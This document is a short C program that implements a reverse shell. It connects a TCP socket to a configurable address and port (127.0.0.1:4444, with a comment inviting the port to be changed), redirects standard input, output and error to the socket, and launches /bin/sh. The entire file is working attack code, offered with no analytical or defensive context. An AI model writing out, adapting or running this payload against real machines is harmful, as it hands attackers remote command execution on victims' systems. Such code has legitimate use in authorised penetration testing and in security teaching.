#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);               // change port if needed
    inet_pton(AF_INET, "127.0.0.1", &server.sin_addr);

    connect(sock, (struct sockaddr*)&server, sizeof(server));
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);

    return 0;
}